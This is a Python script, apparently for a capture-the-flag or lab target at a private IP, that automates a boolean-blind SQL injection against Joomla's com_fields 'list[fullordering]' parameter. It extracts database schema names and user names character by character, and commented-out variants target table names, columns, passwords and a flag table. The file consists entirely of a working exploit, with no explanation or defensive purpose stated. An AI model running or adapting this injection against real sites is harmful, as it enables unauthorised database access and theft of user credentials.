import os
import requests

import sys

# info: https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/



for i in range(100):
    print("")


proxies = {"http":"http://127.0.0.1:8080"}

print("running...")
print()

target = "http://10.10.180.67/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)"
t2 = target.replace("1573=1573", "1573=1572")
tested = False
condition = "1573=1573"

test = "The most recent request was denied because it contained an invalid security token. Please refresh the page and try again."

chars = " -_123456789}{)($£!@./\\*][~';:,><`¬%\"\n0ABCDEFGHIJKLMNOPQRSTUVWXYZ"
#chars = "0123456789"
chars = list(range(0,126))
a = list(range(91,97))
b = list(range(123, 128))


c = a + b
c = c + chars

chars = c

chars.remove(32)

#chars = "_ABCDEFGHIJKLMNOPQRSTUVWXYZ"


#91 - 96
#123 - 127

def check(st):
    r = requests.get(st, proxies=proxies, allow_redirects=False)
    #print(len(r.text))

    #print(st, r.status_code, len(r.text))
    if r.status_code == 303:
        return True
    else: 
        return False
    if test in r.text:
        return True
    else:
        return False


tmp = ""




flip = True
answers = []

#for j in range(int(sys.argv[1]), 175): # word number
for j in range(1, 175): # word number
    
    tmp = "{}: ".format(j)
    tmpp = ""
    notFound = False
    letterFound = True
    for i in range(1,100): # character position
        if not letterFound:
            break
        letterFound = False
        print("getting char: " + str(i))

        #for char in range(0, 256):

        for char in chars:
            #char = ord(char)
            
            # GET DB NAMES           
            # AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
            test = "SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {},1),{},1)=char({})".format(j, i, char)

            
            # GET TABLE NAMES
            # AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),1,1))))> 95,sleep(10),NULL)--

            #test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema LIKE 'joomla' LIMIT {},1),{},1)=char({})".format(j, i, char)
            #test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='joomla' LIMIT {},1),{},1)=char({})".format(j, i, char)
            #test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = concat(char(106)char(111)char(111)char(109)char(108)char(97)) LIMIT {},1),{},1)=char({})".format(j, i, char)
            #test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = concat(char(74)char(79)char(79)char(77)char(76)char(65)) LIMIT {},1),{},1)=char({})".format(j, i, char)
            #test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = concat(char(74)char(111)char(111)char(109)char(108)char(97)) LIMIT {},1),{},1)=char({})".format(j, i, char)
            #test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='JOOMLA' LIMIT {},1),{},1)=char({})".format(j, i, char)

            # GET COLUMN NAMES
            

            
            #test = "SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = concat(char(117),char(115),char(101),char(114)) LIMIT {},1),{},1)=char({})".format(j, i, char)
            
                

            # GET VALUE
            #query = "http://10.10.180.67/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT password FROM users LIMIT {},1),{},1)='{}".format(j, i, char)   

            test = "SUBSTRING((SELECT name FROM #__users LIMIT {},1),{},1)=char({})".format(j, i, char)     





            # get quick answer if table exists
            # http://10.10.180.67/s3cret_manag3r_pag3.php?name=' OR IF(EXISTS (SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'flag_table'),"OK","NO")='OK






            #print(query)
            query = target.replace(condition, test)
            if check(query):
                print(char)
                tmp += str(chr(char))
                letterFound = True
                break
            

            
            #print(tmp)

        print(tmp)
        
        

            




    
    answers.append(tmp)























#for answer in answers:
#    print(answer)
    

